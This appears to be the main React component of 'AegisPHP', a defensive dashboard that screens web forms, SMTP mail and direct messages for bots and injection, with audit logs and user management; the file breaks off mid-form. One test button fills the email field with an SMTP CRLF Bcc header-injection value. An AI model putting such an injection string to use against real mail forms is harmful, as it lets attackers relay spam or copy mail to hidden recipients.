import React, { useState, useMemo, useRef } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Download,
  Copy,
  Check,
  Search,
  RotateCcw,
  Sliders,
  FileCode,
  Scale,
  Mail,
  MessageSquare,
  Globe,
  Webhook,
  AlertTriangle,
  Eye,
  Trash2,
  Play,
  Info,
  X,
  Users,
  UserPlus,
  Key,
  Lock,
  Unlock,
  RefreshCw,
  FileLock,
  UserCheck,
} from 'lucide-react';
import {
  ResponsiveContainer,
  AreaChart,
  Area,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
} from 'recharts';
import {
  ChannelType,
  DefenseConfig,
  ScreeningRequest,
  ScreeningResult,
  VerdictType,
  AegisUser,
  UserRole,
  AuthAuditRecord,
} from './types/defense';
import {
  DEFAULT_DEFENSE_CONFIG,
  PRESET_SCENARIOS,
  build24HourTrendData,
  calculateShannonEntropy,
  detectKeyboardMashOrGibberish,
  evaluateRequest,
  generateInitialAuditLogs,
  pseudonymiseIpUkGdpr,
} from './engine/threatEngine';
import { generatePhpSuite } from './engine/phpCodeGenerator';
import {
  INITIAL_AEGIS_USERS,
  INITIAL_AUTH_AUDIT_LOGS,
  generateSecurePassword,
  calculatePasswordEntropy,
  generateOneTimeToken,
  simulateAes256GcmEncrypt,
} from './engine/vaultSimulator';

type WorkspaceSection = 'screener' | 'logs' | 'compliance' | 'users' | 'php_export';

export default function App() {
  const [activeSection, setActiveSection] = useState<WorkspaceSection>('screener');
  const [config, setConfig] = useState<DefenseConfig>(DEFAULT_DEFENSE_CONFIG);

  // Live Screener Sandbox State
  const [channel, setChannel] = useState<ChannelType>('smtp_mail');
  const [clientIp, setClientIp] = useState<string>('81.134.202.14');
  const [senderEmail, setSenderEmail] = useState<string>('eleanor.vance@meridian-architects.co.uk');
  const [recipientOrTarget, setRecipientOrTarget] = useState<string>('sales@albioncloud.co.uk');
  const [subjectOrTopic, setSubjectOrTopic] = useState<string>(
    'Enterprise Hosting Quote for Q4 Migration'
  );
  const [messageBody, setMessageBody] = useState<string>(
    'Good morning team, we are looking to migrate four PHP 8.3 applications to your Manchester cluster before November. Could we arrange a technical scoping call this Thursday?'
  );

  // Simulated / Editable HTTP Request Headers
  const [userAgent, setUserAgent] = useState<string>(
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15'
  );
  const [acceptLanguage, setAcceptLanguage] = useState<string>('en-GB,en;q=0.9');
  const [secFetchSite, setSecFetchSite] = useState<string>('same-origin');
  const [secFetchMode, setSecFetchMode] = useState<string>('cors');
  const [xForwardedFor, setXForwardedFor] = useState<string>('');

  // Behavioral Telemetry State (Tracks real typing in the form OR preset values)
  const [typingDurationMs, setTypingDurationMs] = useState<number>(14820);
  const [keystrokeCount, setKeystrokeCount] = useState<number>(186);
  const [pasteEventsCount, setPasteEventsCount] = useState<number>(0);
  const [honeypotFilled, setHoneypotFilled] = useState<boolean>(false);
  const [jsTokenPresent, setJsTokenPresent] = useState<boolean>(true);
  const [bannerAgreed, setBannerAgreed] = useState<boolean>(true);
  const [bannerMinimized, setBannerMinimized] = useState<boolean>(false);
  const [showLegalModal, setShowLegalModal] = useState<boolean>(false);

  // Track real live typing cadence when user types inside the sandbox inputs
  const typingStartRef = useRef<number | null>(null);

  const handleLiveKeyDown = () => {
    if (typingStartRef.current === null) {
      typingStartRef.current = performance.now();
    }
    const elapsed = Math.max(120, Math.round(performance.now() - typingStartRef.current));
    setTypingDurationMs(elapsed);
    setKeystrokeCount((prev) => prev + 1);
  };

  const handleLivePaste = () => {
    setPasteEventsCount((prev) => prev + 1);
  };

  // Audit Logs State
  const [auditLogs, setAuditLogs] = useState<ScreeningResult[]>(() =>
    generateInitialAuditLogs(DEFAULT_DEFENSE_CONFIG)
  );
  const [selectedLogId, setSelectedLogId] = useState<string>('AEGIS-8402');
  const [logVerdictFilter, setLogVerdictFilter] = useState<'ALL' | VerdictType>('ALL');
  const [logChannelFilter, setLogChannelFilter] = useState<'ALL' | ChannelType>('ALL');
  const [logSearchQuery, setLogSearchQuery] = useState<string>('');
  const [trendChartMode, setTrendChartMode] = useState<'area' | 'bar'>('area');

  // PHP Export State
  const [selectedArtifactIndex, setSelectedArtifactIndex] = useState<number>(0);
  const [copiedFile, setCopiedFile] = useState<string | null>(null);

  // User & Access Management State
  const [users, setUsers] = useState<AegisUser[]>(INITIAL_AEGIS_USERS);
  const [userSearchQuery, setUserSearchQuery] = useState<string>('');
  const [userRoleFilter, setUserRoleFilter] = useState<'ALL' | UserRole>('ALL');

  // Create User Modal State
  const [showCreateUserModal, setShowCreateUserModal] = useState<boolean>(false);
  const [createUserName, setCreateUserName] = useState<string>('');
  const [createUserEmail, setCreateUserEmail] = useState<string>('');
  const [createUserRole, setCreateUserRole] = useState<UserRole>('responder');
  const [createUserPassword, setCreateUserPassword] = useState<string>('');
  const [createUserMustReset, setCreateUserMustReset] = useState<boolean>(true);
  const [passwordCopiedNotification, setPasswordCopiedNotification] = useState<boolean>(false);
  const [userCreateError, setUserCreateError] = useState<string | null>(null);

  // Password Reset Lifecycle State
  const [activeResetToken, setActiveResetToken] = useState<{
    userId: number;
    email: string;
    token: string;
    tokenHash: string;
    expiresAt: string;
  } | null>(null);
  const [showResetModal, setShowResetModal] = useState<boolean>(false);
  const [resetTokenInput, setResetTokenInput] = useState<string>('');
  const [resetNewPassword, setResetNewPassword] = useState<string>('');
  const [resetStatusMessage, setResetStatusMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  // Cryptographic Vault Simulator State
  const [vaultPlaintext, setVaultPlaintext] = useState<string>('secops-master-key-uk-gdpr-alert-credentials');
  const [vaultResult, setVaultResult] = useState<{
    ivHex: string;
    tagHex: string;
    ciphertextHex: string;
    payloadBase64: string;
  }>(() => simulateAes256GcmEncrypt('secops-master-key-uk-gdpr-alert-credentials'));
  const [vaultCopied, setVaultCopied] = useState<boolean>(false);

  // Authentication Audit Logs
  const [authLogs, setAuthLogs] = useState<AuthAuditRecord[]>(INITIAL_AUTH_AUDIT_LOGS);

  const handleGeneratePasswordForCreate = () => {
    const pwd = generateSecurePassword(18);
    setCreateUserPassword(pwd);
    navigator.clipboard.writeText(pwd);
    setPasswordCopiedNotification(true);
    setTimeout(() => setPasswordCopiedNotification(false), 2500);
  };

  const handleCreateUser = (e: React.FormEvent) => {
    e.preventDefault();
    setUserCreateError(null);

    const emailClean = createUserEmail.trim().toLowerCase();
    if (!emailClean || !emailClean.includes('@')) {
      setUserCreateError('Please enter a valid RFC 5322 email address.');
      return;
    }

    if (users.some((u) => u.email === emailClean)) {
      setUserCreateError('A user with this email address already exists.');
      return;
    }

    if (!createUserName.trim()) {
      setUserCreateError('Please enter the user full name.');
      return;
    }

    const finalPassword = createUserPassword.trim() || generateSecurePassword(18);

    const newUser: AegisUser = {
      id: Math.max(...users.map((u) => u.id), 0) + 1,
      uuid: `usr_${Math.random().toString(36).substring(2, 10)}`,
      email: emailClean,
      name: createUserName.trim(),
      role: createUserRole,
      status: 'active',
      failedAttempts: 0,
      mustChangePassword: createUserMustReset,
      lastLoginAt: null,
      createdAt: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
    };

    setUsers((prev) => [newUser, ...prev]);

    const newAudit: AuthAuditRecord = {
      id: Date.now(),
      timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
      eventType: 'user_created',
      email: emailClean,
      success: true,
      details: `Role: ${createUserRole} (Argon2id Hash Provisioned)`,
    };
    setAuthLogs((prev) => [newAudit, ...prev]);

    setShowCreateUserModal(false);
    setCreateUserName('');
    setCreateUserEmail('');
    setCreateUserPassword('');
  };

  const handleRequestPasswordReset = (user: AegisUser) => {
    const tokenObj = generateOneTimeToken();
    const expires = new Date(Date.now() + 15 * 60 * 1000).toISOString().replace('T', ' ').slice(0, 19) + ' UTC';

    setActiveResetToken({
      userId: user.id,
      email: user.email,
      token: tokenObj.rawToken,
      tokenHash: tokenObj.tokenHash,
      expiresAt: expires,
    });

    setResetTokenInput(tokenObj.rawToken);
    setResetStatusMessage(null);
    setShowResetModal(true);

    const newAudit: AuthAuditRecord = {
      id: Date.now(),
      timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
      eventType: 'password_reset_requested',
      email: user.email,
      success: true,
      details: `15-minute single-use reset token generated (${tokenObj.tokenHash.slice(0, 16)}...)`,
    };
    setAuthLogs((prev) => [newAudit, ...prev]);
  };

  const handleCompletePasswordReset = (e: React.FormEvent) => {
    e.preventDefault();
    if (!activeResetToken) return;

    if (resetTokenInput.trim() !== activeResetToken.token) {
      setResetStatusMessage({ type: 'error', text: 'Invalid or consumed password reset token.' });
      return;
    }

    if (resetNewPassword.length < 12) {
      setResetStatusMessage({ type: 'error', text: 'Password must be at least 12 characters.' });
      return;
    }

    setUsers((prev) =>
      prev.map((u) =>
        u.id === activeResetToken.userId
          ? { ...u, failedAttempts: 0, mustChangePassword: false }
          : u
      )
    );

    const newAudit: AuthAuditRecord = {
      id: Date.now(),
      timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
      eventType: 'password_reset_success',
      email: activeResetToken.email,
      success: true,
      details: 'Password reset completed and verified. Reset token burned.',
    };
    setAuthLogs((prev) => [newAudit, ...prev]);

    setResetStatusMessage({
      type: 'success',
      text: 'Password successfully updated! Token has been invalidated.',
    });
    setActiveResetToken(null);
    setResetNewPassword('');
  };

  const handleToggleUserStatus = (userId: number) => {
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === userId) {
          const nextStatus = u.status === 'active' ? 'disabled' : 'active';
          const newAudit: AuthAuditRecord = {
            id: Date.now(),
            timestamp: new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC',
            eventType: 'user_status_changed',
            email: u.email,
            success: true,
            details: `Account marked as ${nextStatus}`,
          };
          setAuthLogs((l) => [newAudit, ...l]);
          return { ...u, status: nextStatus };
        }
        return u;
      })
    );
  };

  const handleUnlockUser = (userId: number) => {
    setUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, failedAttempts: 0 } : u))
    );
  };

  const handleDeleteUser = (userId: number) => {
    setUsers((prev) => prev.filter((u) => u.id !== userId));
  };

  const handleEncryptVault = () => {
    setVaultResult(simulateAes256GcmEncrypt(vaultPlaintext));
  };

  // Current Live Request Evaluation
  const currentRequest: ScreeningRequest = useMemo(
    () => ({
      channel,
      clientIp,
      senderEmail,
      recipientOrTarget,
      subjectOrTopic,
      messageBody,
      headers: {
        'User-Agent': userAgent,
        'Accept-Language': acceptLanguage,
        'Sec-Fetch-Site': secFetchSite,
        'Sec-Fetch-Mode': secFetchMode,
        'X-Forwarded-For': xForwardedFor,
      },
      telemetry: {
        typingDurationMs,
        keystrokeCount,
        pasteEventsCount,
        honeypotFilled,
        bannerAgreed,
        jsTokenPresent,
      },
    }),
    [
      channel,
      clientIp,
      senderEmail,
      recipientOrTarget,
      subjectOrTopic,
      messageBody,
      userAgent,
      acceptLanguage,
      secFetchSite,
      secFetchMode,
      xForwardedFor,
      typingDurationMs,
      keystrokeCount,
      pasteEventsCount,
      honeypotFilled,
      bannerAgreed,
      jsTokenPresent,
    ]
  );

  const liveEvaluation = useMemo(
    () => evaluateRequest(currentRequest, config),
    [currentRequest, config]
  );

  const liveInputEntropy = useMemo(() => calculateShannonEntropy(messageBody), [messageBody]);
  const liveGibberish = useMemo(() => detectKeyboardMashOrGibberish(messageBody), [messageBody]);

  const phpArtifacts = useMemo(() => generatePhpSuite(config), [config]);

  // Load a preset scenario into the live screener
  const applyPresetScenario = (presetId: string) => {
    const found = PRESET_SCENARIOS.find((p) => p.id === presetId);
    if (!found) return;
    typingStartRef.current = null;
    const r = found.request;
    setChannel(r.channel);
    setClientIp(r.clientIp);
    setSenderEmail(r.senderEmail);
    setRecipientOrTarget(r.recipientOrTarget);
    setSubjectOrTopic(r.subjectOrTopic);
    setMessageBody(r.messageBody);
    setUserAgent(r.headers['User-Agent'] || '');
    setAcceptLanguage(r.headers['Accept-Language'] || '');
    setSecFetchSite(r.headers['Sec-Fetch-Site'] || '');
    setSecFetchMode(r.headers['Sec-Fetch-Mode'] || '');
    setXForwardedFor(r.headers['X-Forwarded-For'] || '');
    setTypingDurationMs(r.telemetry.typingDurationMs);
    setKeystrokeCount(r.telemetry.keystrokeCount);
    setPasteEventsCount(r.telemetry.pasteEventsCount);
    setHoneypotFilled(r.telemetry.honeypotFilled);
    setBannerAgreed(r.telemetry.bannerAgreed);
    setJsTokenPresent(r.telemetry.jsTokenPresent);
  };

  // Commit the current live screening evaluation to the protective audit log
  const handleScreenAndLogRequest = (e: React.FormEvent) => {
    e.preventDefault();
    const newEntry = evaluateRequest(
      {
        ...currentRequest,
        id: `AEGIS-${Math.floor(1000 + Math.random() * 9000)}`,
        timestamp: new Date().toISOString(),
      },
      config
    );
    setAuditLogs((prev) => [newEntry, ...prev]);
    setSelectedLogId(newEntry.id);
  };

  // Simulate a multi-request automated attack & legitimate traffic wave
  const handleSimulateTrafficWave = () => {
    const waveEntries = PRESET_SCENARIOS.map((p, idx) =>
      evaluateRequest(
        {
          ...p.request,
          id: `AEGIS-${Math.floor(1000 + Math.random() * 9000)}`,
          timestamp: new Date(Date.now() - idx * 15000).toISOString(),
        },
        config
      )
    );
    setAuditLogs((prev) => [...waveEntries, ...prev]);
    if (waveEntries[0]) {
      setSelectedLogId(waveEntries[0].id);
    }
  };

  const handleCopyCode = (filename: string, code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedFile(filename);
    setTimeout(() => setCopiedFile(null), 2000);
  };

  const handleDownloadFile = (filename: string, content: string) => {
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const handleDownloadAllBundle = () => {
    const bundleContent = phpArtifacts
      .map(
        (art) =>
          `/* ==========================================================================\n * FILE: ${art.filename} — ${art.title}\n * ========================================================================== */\n\n${art.code}\n\n`
      )
      .join('\n');
    handleDownloadFile('aegis-php-uk-defense-suite.php', bundleContent);
  };

  const handleExportLogsJson = () => {
    const json = JSON.stringify(auditLogs, null, 2);
    handleDownloadFile(`aegis-uk-audit-logs-${new Date().toISOString().slice(0, 10)}.json`, json);
  };

  const filteredLogs = useMemo(() => {
    return auditLogs.filter((item) => {
      if (logVerdictFilter !== 'ALL' && item.verdict !== logVerdictFilter) return false;
      if (logChannelFilter !== 'ALL' && item.channel !== logChannelFilter) return false;
      if (logSearchQuery.trim()) {
        const q = logSearchQuery.toLowerCase();
        const matchIp = item.pseudonymisedIp.toLowerCase().includes(q) || item.rawClientIp.toLowerCase().includes(q);
        const matchEmail = item.senderEmail.toLowerCase().includes(q);
        const matchId = item.id.toLowerCase().includes(q);
        const matchSubject = item.subjectOrTopic.toLowerCase().includes(q);
        if (!matchIp && !matchEmail && !matchId && !matchSubject) return false;
      }
      return true;
    });
  }, [auditLogs, logVerdictFilter, logChannelFilter, logSearchQuery]);

  const filteredUsers = useMemo(() => {
    return users.filter((u) => {
      const q = userSearchQuery.trim().toLowerCase();
      const matchesSearch =
        !q ||
        u.name.toLowerCase().includes(q) ||
        u.email.toLowerCase().includes(q) ||
        u.uuid.toLowerCase().includes(q);
      const matchesRole = userRoleFilter === 'ALL' || u.role === userRoleFilter;
      return matchesSearch && matchesRole;
    });
  }, [users, userSearchQuery, userRoleFilter]);

  const selectedLog = useMemo(
    () => auditLogs.find((l) => l.id === selectedLogId) || filteredLogs[0] || null,
    [auditLogs, selectedLogId, filteredLogs]
  );

  // Summary KPI counts from real logs
  const kpiStats = useMemo(() => {
    const total = auditLogs.length;
    const blocked = auditLogs.filter((l) => l.verdict === 'BLOCK').length;
    const challenged = auditLogs.filter((l) => l.verdict === 'CHALLENGE').length;
    const allowed = auditLogs.filter((l) => l.verdict === 'ALLOW').length;
    const smtpProtected = auditLogs.filter((l) => l.channel === 'smtp_mail' && l.verdict !== 'ALLOW').length;
    return { total, blocked, challenged, allowed, smtpProtected };
  }, [auditLogs]);

  // 24-Hour Time-Series Trend Data for Recharts in Protective Logs
  const trend24hData = useMemo(
    () => build24HourTrendData(auditLogs, logChannelFilter),
    [auditLogs, logChannelFilter]
  );

  const trend24hTotals = useMemo(() => {
    return trend24hData.reduce(
      (acc, pt) => {
        acc.allowed += pt.allowed;
        acc.blocked += pt.blocked;
        acc.challenged += pt.challenged;
        acc.total += pt.total;
        return acc;
      },
      { allowed: 0, blocked: 0, challenged: 0, total: 0 }
    );
  }, [trend24hData]);

  const channelLabel = (ch: ChannelType) => {
    switch (ch) {
      case 'smtp_mail':
        return 'SMTP Mail Dispatch';
      case 'direct_message':
        return 'Direct Message (DM)';
      case 'contact_form':
        return 'Web Contact Form';
      case 'api_webhook':
        return 'API / Webhook POST';
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#090d16] text-slate-100 pb-24">
      {/* Top Bar Contract: 1-row, 3-zone header separated by gap-8 */}
      <header className="sticky top-0 z-30 flex items-center justify-between gap-8 px-6 py-3.5 bg-[#090d16]/95 backdrop-blur border-b border-slate-800/90">
        {/* Zone 1: Brand Title (Single text element wordmark) */}
        <a
          href="#top"
          onClick={(e) => {
            e.preventDefault();
            setActiveSection('screener');
          }}
          className="text-lg font-bold tracking-tight text-white whitespace-nowrap shrink-0"
        >
          AegisPHP
        </a>

        {/* Zone 2: 4 concise single-line text navigation links */}
        <nav className="flex items-center gap-6 text-sm font-medium text-slate-400 overflow-x-auto">
          <button
            type="button"
            onClick={() => setActiveSection('screener')}
            className={`py-1 transition-colors whitespace-nowrap shrink-0 border-b-2 ${
              activeSection === 'screener'
                ? 'text-white border-sky-400'
                : 'border-transparent hover:text-slate-200'
            }`}
          >
            Live Screener
          </button>
          <button
            type="button"
            onClick={() => setActiveSection('logs')}
            className={`py-1 transition-colors whitespace-nowrap shrink-0 border-b-2 ${
              activeSection === 'logs'
                ? 'text-white border-sky-400'
                : 'border-transparent hover:text-slate-200'
            }`}
          >
            Protective Logs
          </button>
          <button
            type="button"
            onClick={() => setActiveSection('compliance')}
            className={`py-1 transition-colors whitespace-nowrap shrink-0 border-b-2 ${
              activeSection === 'compliance'
                ? 'text-white border-sky-400'
                : 'border-transparent hover:text-slate-200'
            }`}
          >
            UK Compliance
          </button>
          <button
            type="button"
            onClick={() => setActiveSection('users')}
            className={`py-1 transition-colors whitespace-nowrap shrink-0 border-b-2 ${
              activeSection === 'users'
                ? 'text-white border-sky-400'
                : 'border-transparent hover:text-slate-200'
            }`}
          >
            Access &amp; Users
          </button>
          <button
            type="button"
            onClick={() => setActiveSection('php_export')}
            className={`py-1 transition-colors whitespace-nowrap shrink-0 border-b-2 ${
              activeSection === 'php_export'
                ? 'text-white border-sky-400'
                : 'border-transparent hover:text-slate-200'
            }`}
          >
            PHP Middleware
          </button>
        </nav>

        {/* Zone 3: 1 Primary Action */}
        <div className="flex items-center shrink-0">
          <button
            type="button"
            onClick={handleDownloadAllBundle}
            className="px-4 py-2 text-xs font-semibold text-slate-950 bg-sky-400 rounded-lg hover:bg-sky-300 transition-colors whitespace-nowrap shrink-0 flex items-center gap-2 cursor-pointer"
          >
            <Download className="w-3.5 h-3.5" />
            <span>Download PHP Suite</span>
          </button>
        </div>
      </header>

      {/* Main Content Container */}
      <main className="flex-1 max-w-[1400px] w-full mx-auto px-6 py-8 space-y-8">
        {/* Top Context Header & Telemetry Summary Bar */}
        <section className="flex flex-col lg:flex-row lg:items-end justify-between gap-6 pb-6 border-b border-slate-800/80">
          <div className="space-y-2 max-w-3xl">
            <div className="text-xs text-slate-400 flex items-center gap-2 flex-wrap">
              <span>PHP 8.1+ Security Middleware</span>
              <span aria-hidden="true">·</span>
              <span>UK GDPR Art. 6(1)(f) &amp; PECR Reg. 6 Compliant</span>
              <span aria-hidden="true">·</span>
              <span>SMTP &amp; Direct Message Protection</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-white">
              Multi-Vector Bot, Behavioral Input &amp; Header Screening Engine
            </h1>
            <p className="text-sm text-slate-400 leading-relaxed">
              Mitigate automated botnets and human attackers across PHP forms, outbound SMTP mailers, and Direct Message channels by combining IP reputation, suspicious email entropy, keyboard-mash &amp; payload heuristics, and HTTP request header validation.
            </p>
          </div>

          {/* High-Density Tabular Metric Strip */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 bg-slate-900/70 border border-slate-800 rounded-lg p-4 shrink-0">
            <div>
              <div className="text-xs text-slate-400">Screened Events</div>
              <div className="text-xl font-bold text-white font-mono tabular-nums mt-0.5">
                {kpiStats.total}
              </div>
            </div>
            <div className="border-l border-slate-800 pl-4">
              <div className="text-xs text-slate-400">Threats Blocked</div>
              <div className="text-xl font-bold text-rose-400 font-mono tabular-nums mt-0.5">
                {kpiStats.blocked}
              </div>
            </div>
            <div className="border-l border-slate-800 pl-4">
              <div className="text-xs text-slate-400">SMTP Injections Stopped</div>
              <div className="text-xl font-bold text-amber-400 font-mono tabular-nums mt-0.5">
                {kpiStats.smtpProtected}
              </div>
            </div>
            <div className="border-l border-slate-800 pl-4">
              <div className="text-xs text-slate-400">UK Retention Window</div>
              <div className="text-xl font-bold text-emerald-400 font-mono tabular-nums mt-0.5">
                {config.logRetentionDays}d
              </div>
            </div>
          </div>
        </section>

        {/* Inline UK Screening Gate Notice (if user selected Inline Form Gate mode in UK Compliance settings) */}
        {config.bannerPosition === 'inline_form_gate' && (
          <section className="bg-slate-900/90 border border-sky-500/40 rounded-lg p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div className="space-y-1 text-xs text-slate-300">
              <div className="font-semibold text-white flex items-center gap-2">
                <Scale className="w-4 h-4 text-sky-400 shrink-0" />
                <span>Mandatory UK Security &amp; Anti-Abuse Screening Gate ({config.organizationName})</span>
              </div>
              <p className="text-slate-400 leading-relaxed">
                Anyone using this website, SMTP mailer, or Direct Message service agrees to automated IP reputation (pseudonymised), email syntax, request header, and behavioral input screening for security and protective logging under UK GDPR Art. 6(1)(f) &amp; PECR Reg. 6.
              </p>
            </div>
            <div className="flex items-center gap-3 shrink-0">
              <button
                type="button"
                onClick={() => setShowLegalModal(true)}
                className="px-3 py-1.5 text-xs font-medium text-slate-300 hover:text-white border border-slate-700 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                Read UK Notice
              </button>
              <button
                type="button"
                onClick={() => setBannerAgreed(!bannerAgreed)}
                className={`px-3.5 py-1.5 text-xs font-semibold rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer ${
                  bannerAgreed
                    ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                    : 'bg-sky-500 text-slate-950 hover:bg-sky-400'
                }`}
              >
                {bannerAgreed ? 'Screening Agreed (Active)' : 'Agree to Security Screening'}
              </button>
            </div>
          </section>
        )}

        {/* ===================================================================
         * WORKSPACE 1: LIVE MULTI-VECTOR SCREENER & SANDBOX
         * =================================================================== */}
        {activeSection === 'screener' && (
          <div className="space-y-6">
            {/* Preset Attack & Legitimate Vector Bar */}
            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
              <div className="space-y-0.5">
                <h2 className="text-sm font-semibold text-white">
                  Load Preset Test Vector or Type Live Input Below
                </h2>
                <p className="text-xs text-slate-400">
                  Test how the PHP defense engine scores legitimate UK users vs. SMTP CRLF header injection, keyboard mashing, and botnet headers.
                </p>
              </div>
              <div className="flex items-center gap-2 flex-wrap">
                {PRESET_SCENARIOS.map((preset) => (
                  <button
                    key={preset.id}
                    type="button"
                    onClick={() => applyPresetScenario(preset.id)}
                    className="px-3 py-1.5 text-xs font-medium bg-slate-800/90 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
                  >
                    {preset.label}
                  </button>
                ))}
              </div>
            </div>

            {/* 2-Column Split: Left = Protected PHP Input Form + Headers | Right = Real-Time 4-Vector Verdict */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
              {/* Left Column (7 cols): Interactive SMTP / DM / Form Sandbox */}
              <form
                onSubmit={handleScreenAndLogRequest}
                className="lg:col-span-7 bg-slate-900/50 border border-slate-800 rounded-lg p-6 space-y-6"
              >
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-800">
                  <div>
                    <h2 className="text-base font-semibold text-white">
                      01. Protected PHP Input &amp; Header Simulator
                    </h2>
                    <p className="text-xs text-slate-400 mt-0.5">
                      Every keystroke, paste event, email format, and HTTP header is evaluated before SMTP or DM execution.
                    </p>
                  </div>

                  {/* Interactive Channel Selector */}
                  <div className="flex items-center gap-1 p-1 bg-slate-950 border border-slate-800 rounded-lg shrink-0">
                    {(
                      [
                        { id: 'smtp_mail', label: 'SMTP Mail', icon: Mail },
                        { id: 'direct_message', label: 'Direct DM', icon: MessageSquare },
                        { id: 'contact_form', label: 'Web Form', icon: Globe },
                        { id: 'api_webhook', label: 'API POST', icon: Webhook },
                      ] as const
                    ).map((item) => {
                      const Icon = item.icon;
                      return (
                        <button
                          key={item.id}
                          type="button"
                          onClick={() => setChannel(item.id)}
                          className={`px-2.5 py-1.5 text-xs font-medium rounded-md transition-colors flex items-center gap-1.5 whitespace-nowrap shrink-0 cursor-pointer ${
                            channel === item.id
                              ? 'bg-slate-800 text-white shadow-xs'
                              : 'text-slate-400 hover:text-slate-200'
                          }`}
                        >
                          <Icon className="w-3.5 h-3.5" />
                          <span>{item.label}</span>
                        </button>
                      );
                    })}
                  </div>
                </div>

                {/* Network & Email Identity Inputs */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-1.5">
                    <div className="flex items-center justify-between text-xs">
                      <label htmlFor="client-ip" className="font-medium text-slate-300">
                        Client IP ($_SERVER[&apos;REMOTE_ADDR&apos;])
                      </label>
                      <span className="text-slate-500 font-mono">
                        {pseudonymiseIpUkGdpr(clientIp, config.ipPseudonymisationMode).slice(0, 18)}
                      </span>
                    </div>
                    <input
                      id="client-ip"
                      type="text"
                      value={clientIp}
                      onChange={(e) => setClientIp(e.target.value)}
                      placeholder="e.g. 81.134.202.14 or 185.220.101.45"
                      className="w-full px-3 py-2 text-sm font-mono bg-slate-950 border border-slate-800 rounded-md text-white focus:outline-none focus:border-sky-400"
                    />
                    <div className="flex items-center gap-2 text-[11px] text-slate-400 flex-wrap">
                      <span>Quick IPs:</span>
                      <button
                        type="button"
                        onClick={() => setClientIp('81.134.202.14')}
                        className="text-sky-400 hover:underline cursor-pointer"
                      >
                        UK BT ISP
                      </button>
                      <span>·</span>
                      <button
                        type="button"
                        onClick={() => setClientIp('185.220.101.45')}
                        className="text-rose-400 hover:underline cursor-pointer"
                      >
                        Tor Exit Node
                      </button>
                      <span>·</span>
                      <button
                        type="button"
                        onClick={() => setClientIp('45.142.214.99')}
                        className="text-amber-400 hover:underline cursor-pointer"
                      >
                        Bulletproof Host
                      </button>
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <div className="flex items-center justify-between text-xs">
                      <label htmlFor="sender-email" className="font-medium text-slate-300">
                        Sender Email ($_POST[&apos;email&apos;])
                      </label>
                      <span className="text-slate-500 font-mono">RFC 5322 + CRLF Check</span>
                    </div>
                    <input
                      id="sender-email"
                      type="text"
                      value={senderEmail}
                      onChange={(e) => setSenderEmail(e.target.value)}
                      onKeyDown={handleLiveKeyDown}
                      onPaste={handleLivePaste}
                      placeholder="user@domain.co.uk"
                      className="w-full px-3 py-2 text-sm font-mono bg-slate-950 border border-slate-800 rounded-md text-white focus:outline-none focus:border-sky-400"
                    />
                    <div className="flex items-center gap-2 text-[11px] text-slate-400 flex-wrap">
                      <span>Test Email:</span>
                      <button
                        type="button"
                        onClick={() => setSenderEmail('x9k8m2v4q1@mailinator.com')}
                        className="text-amber-400 hover:underline cursor-pointer"
                      >
                        Disposable Burner
                      </button>
                      <span>·</span>
                      <button
                        type="button"
                        onClick={() =>
                          setSenderEmail('user@company.co.uk\\r\\nBcc: leached-list@target.com')
                        }
                        className="text-rose-400 hover:underline cursor-pointer"
                      >
                        SMTP Bcc Injection
                      </button>
                    </div>
                  </div>
                </div>

                {/* Recipient & Subject/Topic */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-1.5">
                    <label htmlFor="recipient-field" className="block text-xs font-medium text-slate-300">
                      {channel === 'direct_message'
                        ? 'DM Recipient Handle ($_POST[\'recipient\'])'
                        : 'Target Mailbox / Endpoint'}
                    </label>
                    <input
                      id="recipient-field"
                      type="text"
                      value={recipientOrTarget}
                      onChange={(e) => setRecipientOrTarget(e.target.value)}
                      className="w-full px-3 py-2 text-sm font-mono bg-slate-950 border border-slate-800 rounded-md text-white focus:outline-none focus:border-sky-400"
                    />
                  </div>

                  <div className="space-y-1.5">
                    <label htmlFor="subject-field" className="block text-xs font-medium text-slate-300">
                      {channel === 'smtp_mail'
                        ? 'SMTP Subject Header ($_POST[\'subject\'])'
                        : 'Conversation Topic / Title'}
                    </label>
                    <input
                      id="subject-field"
                      type="text"
                      value={subjectOrTopic}
                      onChange={(e) => setSubjectOrTopic(e.target.value)}
                      onKeyDown={handleLiveKeyDown}
                      onPaste={handleLivePaste}
                      className="w-full px-3 py-2 text-sm bg-slate-950 border border-slate-800 rounded-md text-white focus:outline-none focus:border-sky-400"
                    />
                  </div>
                </div>

